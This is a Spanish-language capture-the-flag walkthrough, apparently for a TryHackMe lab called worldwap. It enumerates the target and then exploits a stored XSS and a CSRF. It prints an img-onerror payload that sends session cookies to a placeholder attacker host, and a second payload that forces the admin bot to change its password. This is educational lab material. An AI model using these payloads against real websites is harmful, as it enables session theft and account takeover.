<h2>Escaneo Inicial</h2>
1. Primero, como siempre, empezamos mirando los puertos.
   ![[Pasted image 20260303123326.png]]
2. Después hacemos un segundo escaneo sobre los puertos abiertos que hemos visto.
   ![[Pasted image 20260303123459.png]]
   Y ojo, porque aquí vemos algo bastante interesante: `httponly: false`.
   ![[Pasted image 20260303123612.png]]
   Por lo que es probable que debamos de usar un XSS en algún momento.
3. Una vez tenemos estos resultados, vamos a enumerar contenido web de los puertos `80` y `8081` (Apache) . Usaremos `dirsearch`, una herramienta genial para la enumeración web (tanto de directorios como de archivos).
	1. Primero para `worldwap.thm`:
	   ![[Pasted image 20260303123928.png]]
	2. Vamos a seguir con el directorio `public/` que es donde estará la web.
	   ![[Pasted image 20260303124109.png]]
	   De aquí nos interesa el directorio `html/`:
	   ![[Pasted image 20260303124220.png]]
	3. Ahora vamos con `worldwap.thm:8081`:
	   ![[Pasted image 20260303124416.png]]

En esta fase hemos encontrado cosas bastante interesantes. Hemos visto:

- Un posible vector de ataque XSS (por flag `HttpOnly` not set).
- Una serie de páginas y scripts que parece que podemos usar para registrarnos, iniciar sesión y cerrar sesión.
- Una serie de documentos no vacíos que nos generan curiosidad como `admin.py` o `setup.php`.

-------------------------------------------------
<h2>Profundización</h2>
Vamos a empezar leyendo los documentos que más curiosidad nos generan:

1. `setup.php`:
   ![[Pasted image 20260303124807.png]]
2. `admin.py`:
   ![[Pasted image 20260303124917.png]]
   Hemos encontrado credenciales, y de hecho funcionan, las he probado, pero no creo que esta sea la forma en la que el creador pretendía que hiciéramos la máquina, por lo que no las usaremos.

Una vez hecho esto vamos a profundizar en la web. Comenzaremos por `worldwap.thm`.

1. Comenzamos yendo a la página tal cual:
   ![[Pasted image 20260303125130.png]]
   Pero aquí no podemos ni navegar ni interactuar con ningún botón.
2. Vamos a ver la página de `login.php`:
   ![[Pasted image 20260303125342.png]]
   Nos apuntamos lo de `login.worldwap.thm`. Vamos a ver qué hay allí si lo metemos en el `/etc/hosts`:
   ![[Pasted image 20260303125612.png]]
   No hay nada.
3. Vamos ahora a ver `register.php`:
   ![[Pasted image 20260303125430.png]]
   Dice que el moderador de la web debe aprobar nuestra cuenta, por lo que parece que pueda haber un bot mirando los registros y validándolos al otro lado.

Vamos a seguir ahora con `worldwap.thm:8081`.

1. Comenzamos yendo a la página tal cual:
   ![[Pasted image 20260303125648.png]]
   Es igual que `login.worldwap.thm`. Si profundizamos haciendo un escaneo con `dirsearch` sobre `login.worldwap.thm` veremos que son exactamente las mismas páginas. Por lo que de ahora en adelante utilizaremos `login.worldwap.thm`.
2. Vamos a ver qué hay en `login.php`:
   ![[Pasted image 20260303125924.png]]
   Parece un panel de inicio de sesión interno.

Con toda la información que hemos recopilado hasta la fecha vamos ahora a la explotación de la página.

-----------------------------------------
<h2>Explotación</h2>
Está claro hasta ahora que primero necesitaremos meternos en la cuenta del moderador y luego en la del administrador, tanto por las preguntas sobre las flags como porque lo que hemos visto aparenta ser vulnerable hacia el moderador primero.

1. Comenzamos yendo al formulario de registro de `worldwap.thm`:
   ![[Pasted image 20260303130249.png]]
2. Vamos a intentar realizar un ataque XSS para robar la cookie de sesión del moderador.
	1. Para ello necesitamos un payload: `<img src="x" onerror="fetch('http://IP_ATACANTE:PUERTO_ATACANTE?cookie=' + document.cookie);">`
	2. Y lo meteremos en uno de los campos.
	   ![[Pasted image 20260303133216.png]]
	3. Levantaremos un servidor de escucha.
	   ![[Pasted image 20260303133229.png]]
	4. Le daremos a `Register`:
	   ![[Pasted image 20260303130939.png]]
	5. Miraremos los resultados de conexión.
	   ![[Pasted image 20260303133317.png]]
	6. Cambiamos la cookie en `login.worldwap.thm/login.php`:
	   ![[Pasted image 20260303133418.png]]

Una vez hemos obtenido la flag de `moderator` tenemos que averiguar la forma de conseguir la flag de admin.

Si investigamos la página podemos ver que hay un formulario de cambio de contraseña:

![[Pasted image 20260303133545.png]]

También observamos que hay un chat en el que sólo hay un usuario en linea, el administrador:

![[Pasted image 20260303133631.png]]

Además es un bot, justo como moderator.

1. Vamos a usar una técnica de CSRF para intentar cambiar la contraseña del admin, puesto que el cambio de contraseña está reservado a él.
   ![[Pasted image 20260303133731.png]]
2. Para ello primero vamos a capturar una petición de esta página.
   ![[Pasted image 20260303134011.png]]
3. Ahora vamos al chat y crafteamos una imagen maliciosa.

```
<img src="x" onerror="fetch('/change_password.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'new_password=1234'})">
```

3. La escribimos en el chat del admin bot.
   ![[Pasted image 20260303134058.png]]
4. Ahora cerramos la sesión del moderador y nos logueamos como admin con `admin:1234`.
   ![[Pasted image 20260303134135.png]]
5. Y así es como conseguimos la flag de admin de forma legítima.
   ![[Pasted image 20260303134202.png]]

-----------------------------------
<h2>Conclusión</h2>
En esta máquina hemos podido observar un vector de ataque (`HttpOnly: false`) que nos permitía obtener la cookie en JavaScript y mandarla a un servidor externo mediante XSS. Con esa cookie podíamos explotar una vulnerabilidad CSRF en el chat para conseguir que el admin cambiara su contraseña sin querer y con ello iniciar sesión como administrador del sitio.

Un reto divertido que pone a prueba alguna de las técnicas aprendidas en el módulo de ataques avanzados del lado del cliente.

>[!SUCCESS] Reto superado!

